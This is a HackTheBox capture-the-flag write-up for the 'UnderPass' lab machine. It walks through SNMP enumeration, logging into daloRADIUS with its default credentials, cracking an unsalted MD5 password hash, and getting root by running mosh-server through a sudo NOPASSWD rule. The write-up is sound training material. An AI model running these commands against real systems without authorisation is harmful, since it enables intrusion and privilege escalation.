# HackTheBox — UnderPass | Full Writeup

> **Platform:** HackTheBox
> **Author:** k41r0s3
> **Difficulty:** Easy
> **Category:** Linux
> **Date:** 2026-03-26

---

## Table of Contents

1. [TL;DR](#tldr)
2. [Recon](#recon)
3. [SNMP Enumeration](#snmp-enumeration)
4. [daloRADIUS — Default Credentials](#daloradius--default-credentials)
5. [Initial Access — SSH](#initial-access--ssh)
6. [Privilege Escalation — sudo mosh-server](#privilege-escalation--sudo-mosh-server)
7. [Attack Chain](#attack-chain)
8. [Tools Used](#tools-used)
9. [Vulnerabilities Exploited](#vulnerabilities-exploited)
10. [What Failed — Dead Ends](#what-failed--dead-ends)
11. [Key Takeaways](#key-takeaways)

---

## TL;DR

UnderPass is an Easy Linux box where the TCP surface looks completely dead — only SSH and a default Apache page. The intended path runs entirely through UDP: SNMP on port 161 is open with the default `public` community string, and its `sysName` field explicitly names the running application as daloRADIUS. Navigating to the daloRADIUS operator login page and using the default credentials grants access to the management panel, where a RADIUS user is stored with a weakly-hashed password. Cracking the hash and SSHing in gives the user flag. Privilege escalation exploits a `sudo NOPASSWD` rule on `/usr/bin/mosh-server` — running it as root and connecting with `mosh-client` yields a full interactive root shell.

---

## Recon

### TCP Port Scan

```bash
nmap -sV -sC -p- --min-rate 2000 -T3 <TARGET> -oN full_scan.txt
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
```

**Thought process:** Only SSH and HTTP visible on TCP. The web root served the default Apache Ubuntu page — no custom app, no CMS, no login form. Directory fuzzing only returned `.htaccess`, `.htpasswd`, and `server-status` as 403s, with nothing actionable. With TCP exhausted, the box name "UnderPass" suggested something hidden — pivoted to UDP.

### Web Enumeration

```bash
# Rate-limited fuzzing for high-latency VPN connections
ffuf -u http://<TARGET>/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -rate 20 -timeout 30 -mc 200,301,302,403
```

| Path | Status | Notes |
| --- | --- | --- |
| `/` | 200 | Default Apache Ubuntu page |
| `/.htpasswd` | 403 | File exists but blocked |
| `/server-status` | 403 | mod_status blocked |

**Thought process:** The `.htpasswd` 403 (not 404) confirms the file exists. Not directly exploitable, but worth noting. Nothing else of value at root — the real application is elsewhere.

### UDP Port Scan

```bash
sudo nmap -sU --top-ports 100 -T3 <TARGET> -oN udp_scan.txt
```

```
PORT      STATE         SERVICE
161/udp   open          snmp
1812/udp  open|filtered radius
1813/udp  open|filtered radacct
```

**Thought process:** SNMP open on 161 — high-value target for info disclosure. RADIUS ports 1812/1813 alongside SNMP strongly suggest a RADIUS management panel is running. daloRADIUS is the most common web UI for FreeRADIUS on Linux.

---

## SNMP Enumeration

```bash
# Enumerate with default public community string
snmpwalk -v2c -c public <TARGET>

# Clean summary
snmp-check <TARGET> -c public
```

**Key SNMP fields leaked:**

| OID | Value |
|-----|-------|
| sysDescr | `Linux underpass 5.15.0-126-generic x86_64` |
| sysContact | `steve@underpass.htb` |
| sysName | `UnDerPass.htb is the only daloradius server in the basin!` |
| sysLocation | `Nevada, U.S.A. but not Vegas` |

**Key findings:**
- Hostname: `underpass.htb` → add to `/etc/hosts`
- Admin email: `steve@underpass.htb` → valid username
- sysName literally names the application: **daloRADIUS**

**Thought process:** The `sysName` field is the pivot. It directly reveals the application running on the box. Combined with the RADIUS UDP ports, this confirms daloRADIUS is accessible via HTTP — just not at the web root.

---

## daloRADIUS — Default Credentials

### Finding the Login Page

daloRADIUS operator login is always at a known path:

```bash
curl http://<TARGET>/daloradius/app/operators/login.php
# Returns: 200 OK — daloRADIUS 2.2 beta login form
```

**Thought process:** The root 403'd, but the specific operator login path works. daloRADIUS ships with a default operator account — try it before anything else.

### Login with Default Credentials

```bash
# Default credentials: administrator:radius
curl -c cookies.txt -b cookies.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "operator_user=administrator&operator_pass=radius&csrf_token=<TOKEN>" \
  http://<TARGET>/daloradius/app/operators/dologin.php
# 302 → index.php → Dashboard (successful login)
```

### Extracting the RADIUS User Hash

With admin access, the users list at `mng-list-all.php` shows all RADIUS users and their stored passwords:

```bash
# Navigate to: /daloradius/app/operators/mng-list-all.php
# Found: username svcMosh with a 32-character hex hash (MD5)
```

### Cracking the Hash

```bash
echo "svcMosh:<HASH>" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show --format=raw-md5 hash.txt
# Password cracked — found in rockyou wordlist
```

**Thought process:** 32-char hex = MD5. daloRADIUS stores RADIUS user passwords as plain MD5 — no salt, no stretching. Rockyou cracks it in under a second. The username `svcMosh` is a strong hint that `mosh-server` will appear in the sudo rules — noted for privesc.

---

## Initial Access — SSH

With the cracked credentials, SSH access is straightforward:

```bash
ssh svcMosh@<TARGET>
# Enter cracked password
```

```
svcMosh@underpass:~$ id
uid=1002(svcMosh) gid=1002(svcMosh) groups=1002(svcMosh)
```

---

## Privilege Escalation — sudo mosh-server

### Sudo Rights

```bash
sudo -l
```

```
User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

**Thought process:** `mosh-server` spawns an interactive shell subprocess. When executed via `sudo`, that subprocess inherits root's UID. The `mosh-client` on the attacker machine connects to it over UDP, creating a full interactive root PTY — equivalent to `sudo bash` delivered through a network protocol.

### The Vulnerability

Mosh (Mobile Shell) works by having `mosh-server` run on the target and `mosh-client` connect to it over UDP. The server generates a random encryption key printed to stdout (`MOSH CONNECT <port> <KEY>`). If `mosh-server` runs as root, the resulting shell is a root shell — there is no privilege drop or sandboxing.

### Exploitation

**Step 1 — On the target, launch mosh-server as root:**
```bash
sudo /usr/bin/mosh-server new -p 60002
```
```
MOSH CONNECT 60002 <RANDOM_KEY>
[mosh-server detached, pid = <PID>]
```

**Step 2 — On the attacker machine, install mosh and connect:**
```bash
# Install mosh-client if not present
sudo apt install mosh

# Connect using the key from Step 1
MOSH_KEY=<RANDOM_KEY> mosh-client <TARGET> 60002
```

**Why it works:** `sudo /usr/bin/mosh-server` forks a shell process owned by root. The `MOSH_KEY` authenticates the UDP session. There are no restrictions — the resulting shell has full root privileges.

### Root Access

```bash
root@underpass:~# id
uid=0(root) gid=0(root) groups=0(root)

root@underpass:~# cat /root/root.txt
# <root flag>
```

---

## Attack Chain

```
nmap TCP → Port 22 (SSH), 80 (Apache default page)
│
├── Port 80 — Apache default page
│   └── ffuf dir fuzz → 403s only, nothing useful
│       └── Dead end on TCP
│
└── nmap UDP → Port 161 (SNMP), 1812/1813 (RADIUS)
    └── snmpwalk -v2c -c public
        └── sysName: "UnDerPass.htb is the only daloradius server"
        └── sysContact: steve@underpass.htb
            └── /daloradius/app/operators/login.php → login found
                └── administrator:radius (default creds) → admin access
                    └── mng-list-all.php → svcMosh MD5 hash
                        └── john raw-md5 rockyou → password cracked
                            └── SSH as svcMosh
                                └── user.txt ✅
                                    └── sudo -l → NOPASSWD /usr/bin/mosh-server
                                        └── sudo mosh-server new -p 60002
                                            └── MOSH_KEY + mosh-client → root shell
                                                └── root.txt ✅
```

---

## Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | TCP + UDP port scanning and service detection |
| `ffuf` | Directory fuzzing (rate-limited for high-latency VPN) |
| `snmpwalk` | SNMP enumeration via public community string |
| `snmp-check` | Clean formatted SNMP system summary |
| `curl` | Web requests and daloRADIUS login automation |
| `john` | MD5 hash cracking with rockyou wordlist |
| `mosh-client` | Connect to root mosh-server session over UDP |

---

## Vulnerabilities Exploited

| Vulnerability | Location | Impact |
| --- | --- | --- |
| SNMP information disclosure | UDP port 161 | Leaked app name, hostname, admin email |
| Default credentials | daloRADIUS operator login | Full admin panel access |
| Weak password hashing (plain MD5) | daloRADIUS user database | RADIUS user password cracked via rockyou |
| sudo NOPASSWD mosh-server | svcMosh sudo rule | Full root shell via mosh-client |

---

## What Failed — Dead Ends

| Approach | Why It Failed |
| --- | --- |
| TCP-only recon | Missed SNMP entirely — SSH and Apache default page are dead ends |
| gobuster (50 threads) | High latency (~450ms avg RTT) caused request timeouts — switched to ffuf with `-rate 20` |
| SNMP community strings `private`, `manager` | Only `public` worked — but it was enough |

---

## Key Takeaways

**1. Always run UDP scans — TCP alone is incomplete**
This box is unsolvable without UDP recon. SNMP on 161/udp was the entire pivot point. `sudo nmap -sU --top-ports 100` should be standard in every recon workflow alongside TCP.

**2. SNMP sysName and sysContact are underrated intel**
The `sysName` field explicitly named daloRADIUS. `sysContact` gave a valid username and domain. Don't just confirm SNMP is open — read every field for application and user intel.

**3. RADIUS + SNMP = check for daloRADIUS**
UDP ports 1812/1813 alongside SNMP is a pattern. Go straight to `/daloradius/app/operators/login.php` with `administrator:radius` — this is the default that many deployments never change.

**4. Service account usernames hint at privesc paths**
`svcMosh` named the service before `sudo -l` confirmed it. When you see a service account, check if that binary has elevated rights — it's often intentional by the box designer.

**5. High-latency VPN requires tool tuning**
Standard gobuster with 50 threads fails on >300ms latency. Use `ffuf -rate 20 -timeout 30` for reliable fuzzing on slow HTB VPN connections.

---

*Written by k41r0s3 | HackTheBox | UnderPass | Easy*
